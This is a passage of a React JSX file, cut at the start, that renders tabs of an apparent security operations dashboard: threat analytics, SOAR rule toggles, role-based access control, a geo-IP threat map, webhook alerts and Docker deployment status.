                  style={{ background: model.status === 'READY' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(52, 211, 153, 0.2)', border: `1px solid ${model.status === 'READY' ? '#ef4444' : '#34d399'}`, color: model.status === 'READY' ? '#ef4444' : '#34d399', padding: '0.6rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                >
                  Toggle {model.status === 'READY' ? 'Standby' : 'Ready'}
                </button>
              </div>
            ))}
          </div>
        )}

        {/* THREAT ANALYTICS TAB */}
        {activeTab === 'Threat Analytics' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>ADVANCED THREAT EXPORT & AUDIT</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1.2rem' }}>Download structured security audit reports for compliance & review</span>
                
                <div style={{ display: 'flex', gap: '1rem' }}>
                  <button 
                    onClick={() => exportReport('json')}
                    style={{ background: `${COL_PLASMA_BLUE}26`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.7rem 1.2rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                  >
                    Export JSON Telemetry
                  </button>
                  <button 
                    onClick={() => exportReport('csv')}
                    style={{ background: 'rgba(52, 211, 153, 0.2)', border: '1px solid #34d399', color: '#34d399', padding: '0.7rem 1.2rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                  >
                    Export CSV Flow Logs
                  </button>
                </div>

                {exportStatus && (
                  <div style={{ marginTop: '1rem', padding: '0.7rem', background: 'rgba(52, 211, 153, 0.1)', border: '1px solid #34d399', borderRadius: '6px', fontSize: '0.75rem', color: '#34d399' }}>
                    {exportStatus}
                  </div>
                )}
              </div>

              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>INCIDENT SEVERITY BREAKDOWN</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Aggregated telemetry analytics</span>
                
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '1rem' }}>
                  <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1rem', borderRadius: '8px', border: '1px solid rgba(239, 68, 68, 0.3)' }}>
                    <div style={{ fontSize: '0.65rem', color: '#ef4444', marginBottom: '0.3rem' }}>CRITICAL</div>
                    <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.flows.filter(f => f.severity === 'CRITICAL').length}</div>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1rem', borderRadius: '8px', border: '1px solid rgba(245, 158, 11, 0.3)' }}>
                    <div style={{ fontSize: '0.65rem', color: '#f59e0b', marginBottom: '0.3rem' }}>HIGH / TARPIT</div>
                    <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.flows.filter(f => f.severity === 'HIGH').length}</div>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1rem', borderRadius: '8px', border: '1px solid rgba(52, 211, 153, 0.3)' }}>
                    <div style={{ fontSize: '0.65rem', color: '#34d399', marginBottom: '0.3rem' }}>LOW / ALLOW</div>
                    <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.flows.filter(f => f.severity === 'LOW').length}</div>
                  </div>
                </div>
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SYSTEM HEALTH SUMMARY</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Kernel & Daemon status metrics</span>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem', fontSize: '0.75rem' }}>
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.8rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#9ca3af' }}>eBPF Ring Buffer:</span>
                  <span style={{ color: '#34d399', fontWeight: 'bold' }}>OPTIMIZED</span>
                </div>
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.8rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#9ca3af' }}>SQLi Guardwall:</span>
                  <span style={{ color: '#34d399', fontWeight: 'bold' }}>ACTIVE</span>
                </div>
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.8rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#9ca3af' }}>SSH Tarpit Delay:</span>
                  <span style={{ color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>{telemetry.tarpit_delay}</span>
                </div>
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.8rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#9ca3af' }}>Socket State:</span>
                  <span style={{ color: '#34d399', fontWeight: 'bold' }}>CONNECTED</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* SOAR PLAYBOOKS TAB */}
        {activeTab === 'SOAR Playbooks' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>AUTOMATED SECURITY ORCHESTRATION (SOAR)</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1.2rem' }}>Configure automated incident response workflows & kernel mitigation triggers</span>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
                {soarRules.map((rule) => (
                  <div key={rule.id} style={{ background: 'rgba(0,0,0,0.4)', padding: '1rem 1.2rem', borderRadius: '10px', border: `1px solid ${rule.enabled ? COL_PLASMA_BLUE + '44' : 'rgba(255,255,255,0.08)'}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div>
                      <div style={{ fontSize: '0.8rem', fontWeight: 'bold', color: '#fff', marginBottom: '0.2rem' }}>{rule.name}</div>
                      <div style={{ fontSize: '0.65rem', color: '#9ca3af' }}>Trigger: <span style={{ color: COL_PLASMA_BLUE }}>{rule.trigger}</span> | Action: <span style={{ color: '#34d399' }}>{rule.action}</span></div>
                    </div>
                    
                    <button 
                      onClick={() => toggleSoarRule(rule.id)}
                      style={{ 
                        background: rule.enabled ? 'rgba(52, 211, 153, 0.2)' : 'rgba(239, 68, 68, 0.2)', 
                        border: `1px solid ${rule.enabled ? '#34d399' : '#ef4444'}`, 
                        color: rule.enabled ? '#34d399' : '#ef4444', 
                        padding: '0.5rem 1rem', 
                        borderRadius: '6px', 
                        fontWeight: 'bold', 
                        fontSize: '0.7rem', 
                        cursor: 'pointer', 
                        fontFamily: FONT_MONO 
                      }}
                    >
                      {rule.enabled ? 'ACTIVE' : 'DISABLED'}
                    </button>
                  </div>
                ))}
              </div>

              {soarStatus && (
                <div style={{ marginTop: '1.2rem', padding: '0.7rem', background: `${COL_PLASMA_BLUE}1a`, border: `1px solid ${COL_PLASMA_BLUE}`, borderRadius: '6px', fontSize: '0.75rem', color: COL_PLASMA_BLUE }}>
                  {soarStatus}
                </div>
              )}
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SOAR ENGINE STATUS</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Automated remediation daemon</span>
              
              <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}33`, display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                <div>[+] Playbook Engine: ONLINE</div>
                <div>[+] Latency: &lt; 2ms response</div>
                <div>[+] Active Triggers: {soarRules.filter(r => r.enabled).length} rules</div>
                <div>[+] Auto-Quarantine: READY</div>
              </div>
            </div>
          </div>
        )}

        {/* ACCESS CONTROL (RBAC) TAB */}
        {activeTab === 'Access Control (RBAC)' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>MULTI-TENANT ROLE-BASED ACCESS CONTROL</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1.2rem' }}>Manage operator accounts, privilege tiers, and security access levels</span>
              
              <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr 1fr 1fr 1fr', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '0.5rem', marginBottom: '0.5rem' }}>
                <span>USERNAME</span>
                <span>ROLE</span>
                <span>MFA</span>
                <span>STATUS</span>
                <span>ACTION</span>
              </div>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                {rbacUsers.map((user) => (
                  <div key={user.id} style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr 1fr 1fr 1fr', fontSize: '0.75rem', padding: '0.7rem 0.4rem', alignItems: 'center', background: 'rgba(0,0,0,0.4)', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                    <span style={{ color: '#fff', fontWeight: 'bold' }}>{user.username}</span>
                    <span style={{ color: COL_PLASMA_BLUE }}>{user.role}</span>
                    <span style={{ color: user.mfa === 'Enabled' ? '#34d399' : '#f59e0b' }}>{user.mfa}</span>
                    <span style={{ color: user.status === 'Active' ? '#34d399' : '#ef4444', fontWeight: 'bold' }}>{user.status}</span>
                    <button 
                      onClick={() => toggleUserStatus(user.id)}
                      style={{ 
                        background: user.status === 'Active' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(52, 211, 153, 0.2)', 
                        border: `1px solid ${user.status === 'Active' ? '#ef4444' : '#34d399'}`, 
                        color: user.status === 'Active' ? '#ef4444' : '#34d399', 
                        padding: '0.3rem 0.6rem', 
                        borderRadius: '6px', 
                        fontWeight: 'bold', 
                        fontSize: '0.65rem', 
                        cursor: 'pointer', 
                        fontFamily: FONT_MONO 
                      }}
                    >
                      {user.status === 'Active' ? 'Suspend' : 'Activate'}
                    </button>
                  </div>
                ))}
              </div>

              {rbacStatus && (
                <div style={{ marginTop: '1.2rem', padding: '0.7rem', background: `${COL_PLASMA_BLUE}1a`, border: `1px solid ${COL_PLASMA_BLUE}`, borderRadius: '6px', fontSize: '0.75rem', color: COL_PLASMA_BLUE }}>
                  {rbacStatus}
                </div>
              )}
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>AUDIT TRAIL LOGS</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Immutable administrative action stream</span>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', maxHeight: '300px', overflowY: 'auto' }}>
                  {auditTrails.map((audit, idx) => (
                    <div key={idx} style={{ background: 'rgba(0,0,0,0.5)', padding: '0.7rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, fontSize: '0.7rem' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.2rem' }}>
                        <span style={{ color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>{audit.user}</span>
                        <span style={{ color: '#6b7280', fontSize: '0.6rem' }}>{audit.timestamp}</span>
                      </div>
                      <div style={{ color: '#fff' }}>{audit.action}</div>
                      <div style={{ color: '#34d399', fontSize: '0.6rem', marginTop: '0.2rem' }}>[{audit.category}]</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* THREAT VECTOR MAP TAB */}
        {activeTab === 'Threat Vector Map' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>GLOBAL THREAT VECTOR & GEO-IP MAP</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Live geographic origin telemetry & attack trajectories</span>
              
              <div style={{ position: 'relative', height: '320px', background: 'rgba(3, 7, 18, 0.8)', borderRadius: '12px', border: `1px solid ${COL_PLASMA_BLUE}33`, overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <div style={{ position: 'absolute', inset: 0, backgroundImage: 'radial-gradient(rgba(0,242,255,0.1) 1px, transparent 1px)', backgroundSize: '24px 24px', opacity: 0.6 }}></div>
                
                <div style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', display: 'flex', flexDirection: 'column', alignItems: 'center', zIndex: 5 }}>
                  <div style={{ width: '16px', height: '16px', backgroundColor: COL_PLASMA_BLUE, borderRadius: '50%', boxShadow: `0 0 15px ${COL_PLASMA_BLUE}`, animation: 'pulse 2s infinite' }}></div>
                  <span style={{ fontSize: '0.6rem', color: COL_PLASMA_BLUE, marginTop: '4px', background: 'rgba(0,0,0,0.8)', padding: '2px 6px', borderRadius: '4px' }}>PHANTOMNET CORE</span>
                </div>

                {geoThreats.map((threat, idx) => (
                  <div 
                    key={idx}
                    onClick={() => setSelectedGeoThreat(threat)}
                    style={{ 
                      position: 'absolute', 
                      top: threat.coordinates.y, 
                      left: threat.coordinates.x, 
                      cursor: 'pointer',
                      transform: 'translate(-50%, -50%)',
                      zIndex: 10
                    }}
                  >
                    <div style={{ 
                      width: '12px', 
                      height: '12px', 
                      backgroundColor: threat.risk === 'Critical' ? '#ef4444' : '#f59e0b', 
                      borderRadius: '50%', 
                      boxShadow: `0 0 12px ${threat.risk === 'Critical' ? '#ef4444' : '#f59e0b'}`,
                      border: '2px solid #fff'
                    }}></div>
                    <div style={{ fontSize: '0.6rem', color: '#fff', background: 'rgba(0,0,0,0.85)', padding: '2px 6px', borderRadius: '4px', marginTop: '3px', whiteSpace: 'nowrap', border: '1px solid rgba(255,255,255,0.1)' }}>
                      {threat.city} ({threat.vector})
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>VECTOR INSPECTOR</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Selected origin intelligence</span>
              
              <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#9ca3af', minHeight: '260px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                {selectedGeoThreat ? (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '0.7rem' }}>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Origin IP:</strong> {selectedGeoThreat.ip}</div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Location:</strong> {selectedGeoThreat.city}, {selectedGeoThreat.country}</div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Attack Vector:</strong> {selectedGeoThreat.vector}</div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Risk Level:</strong> <span style={{ color: selectedGeoThreat.risk === 'Critical' ? '#ef4444' : '#f59e0b' }}>{selectedGeoThreat.risk}</span></div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Defense Action:</strong> <span style={{ color: '#34d399' }}>{selectedGeoThreat.status}</span></div>
                  </div>
                ) : (
                  'Click on any threat node on the global map to inspect origin geo-intelligence and attack vector attributes.'
                )}
              </div>
            </div>
          </div>
        )}

        {/* ALERTS & WEBHOOKS TAB */}
        {activeTab === 'Alerts & Webhooks' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>WEBHOOK & ALERT PIPELINE CONFIGURATION</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1.2rem' }}>Connect real-time security incident feeds to Slack, PagerDuty, or SIEM endpoints</span>
              
              <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1.5fr 1fr 1fr', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '0.5rem', marginBottom: '0.5rem' }}>
                <span>INTEGRATION NAME</span>
                <span>TARGET ENDPOINT</span>
                <span>STATUS</span>
                <span>ACTION</span>
              </div>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1.5rem' }}>
                {webhooks.map((hook) => (
                  <div key={hook.id} style={{ display: 'grid', gridTemplateColumns: '1.5fr 1.5fr 1fr 1fr', fontSize: '0.75rem', padding: '0.7rem 0.4rem', alignItems: 'center', background: 'rgba(0,0,0,0.4)', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                    <span style={{ color: '#fff', fontWeight: 'bold' }}>{hook.name}</span>
                    <span style={{ color: '#9ca3af', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{hook.url}</span>
                    <span style={{ color: hook.status === 'Connected' ? '#34d399' : '#f59e0b', fontWeight: 'bold' }}>{hook.status}</span>
                    <button 
                      onClick={() => toggleWebhookStatus(hook.id)}
                      style={{ 
                        background: hook.status === 'Connected' ? 'rgba(245, 158, 11, 0.2)' : 'rgba(52, 211, 153, 0.2)', 
                        border: `1px solid ${hook.status === 'Connected' ? '#f59e0b' : '#34d399'}`, 
                        color: hook.status === 'Connected' ? '#f59e0b' : '#34d399', 
                        padding: '0.3rem 0.6rem', 
                        borderRadius: '6px', 
                        fontWeight: 'bold', 
                        fontSize: '0.65rem', 
                        cursor: 'pointer', 
                        fontFamily: FONT_MONO 
                      }}
                    >
                      {hook.status === 'Connected' ? 'Pause' : 'Connect'}
                    </button>
                  </div>
                ))}
              </div>

              <div style={{ borderTop: `1px solid ${COL_PLASMA_BLUE}22`, paddingTop: '1.2rem' }}>
                <div style={{ fontSize: '0.8rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.3rem' }}>TEST INCIDENT WEBHOOK DISPATCH</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '0.8rem' }}>Trigger simulated critical alert payload to destination endpoint</span>
                
                <form onSubmit={sendTestAlert} style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  <input 
                    type="text" 
                    value={testWebhookUrl}
                    onChange={(e) => setTestWebhookUrl(e.target.value)}
                    style={{ background: 'rgba(0,0,0,0.5)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '8px', padding: '0.6rem 0.8rem', color: '#fff', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                  />
                  <button 
                    type="submit"
                    style={{ background: `${COL_PLASMA_BLUE}26`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.6rem 1rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO, alignSelf: 'flex-start' }}
                  >
                    Send Test Alert Packet
                  </button>
                </form>

                {webhookTestStatus && (
                  <div style={{ marginTop: '0.8rem', padding: '0.7rem', background: `${COL_PLASMA_BLUE}1a`, border: `1px solid ${COL_PLASMA_BLUE}`, borderRadius: '6px', fontSize: '0.75rem', color: COL_PLASMA_BLUE }}>
                    {webhookTestStatus}
                  </div>
                )}
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>ALERT GATEWAY STATS</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Outgoing dispatch metrics</span>
              
              <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}33`, display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                <div>[+] Dispatch Queue: EMPTY</div>
                <div>[+] Success Rate: 99.98%</div>
                <div>[+] Active Sinks: {webhooks.filter(w => w.status === 'Connected').length} endpoints</div>
                <div>[+] Retry Policy: Exponential Backoff</div>
              </div>
            </div>
          </div>
        )}

        {/* SYSTEM HEALTH & DEPLOYMENT TAB (DAY 10) */}
        {activeTab === 'System Health & Deployment' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>DOCKER COMPOSE PRODUCTION TOPOLOGY</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1.2rem' }}>Manage containerized services, health status, and cluster deployment hardening</span>
              
              <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1.5fr 1fr 1fr', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '0.5rem', marginBottom: '0.5rem' }}>
                <span>SERVICE CONTAINER</span>
                <span>CONTAINER IMAGE</span>
                <span>PORTS</span>
                <span>STATUS</span>
              </div>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1.5rem' }}>
                {dockerServices.map((srv, idx) => (
                  <div key={idx} style={{ display: 'grid', gridTemplateColumns: '1.5fr 1.5fr 1fr 1fr', fontSize: '0.75rem', padding: '0.7rem 0.4rem', alignItems: 'center', background: 'rgba(0,0,0,0.4)', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                    <span style={{ color: '#fff', fontWeight: 'bold' }}>{srv.name}</span>
                    <span style={{ color: '#9ca3af' }}>{srv.image}</span>
                    <span style={{ color: COL_PLASMA_BLUE }}>{srv.ports}</span>
                    <span style={{ color: '#34d399', fontWeight: 'bold' }}>{srv.status}</span>
                  </div>
                ))}
              </div>

              <div style={{ borderTop: `1px solid ${COL_PLASMA_BLUE}22`, paddingTop: '1.2rem' }}>
                <div style={{ fontSize: '0.8rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.3rem' }}>PRODUCTION HARDENING SECURITY SCAN</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '0.8rem' }}>Verify kernel isolation, container privileges, and TLS encryption ciphers</span>
                
                <button 
                  onClick={executeHardeningScan}
                  style={{ background: `${COL_PLASMA_BLUE}26`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.7rem 1.2rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                >
                  Execute Production Hardening Scan
                </button>

                {hardeningStatus && (
                  <div style={{ marginTop: '0.8rem', padding: '0.7rem', background: `${COL_PLASMA_BLUE}1a`, border: `1px solid ${COL_PLASMA_BLUE}`, borderRadius: '6px', fontSize: '0.75rem', color: COL_PLASMA_BLUE }}>
                    {hardeningStatus}
                  </div>
                )}
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>CLUSTER MODE & CONFIG</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Deployment architecture settings</span>
              
              <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}33`, display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                <div>[+] Architecture: Docker Compose v2</div>
                <div>[+] Mode: {clusterMode}</div>
                <div>[+] Redis Cache: CONNECTED</div>
                <div>[+] eBPF Ring Buffer: SECURE</div>
                <div>[+] TLS Certificate: Valid (Let's Encrypt)</div>
              </div>
            </div>
          </div>
        )}

      </main>
    </div>
  );
}
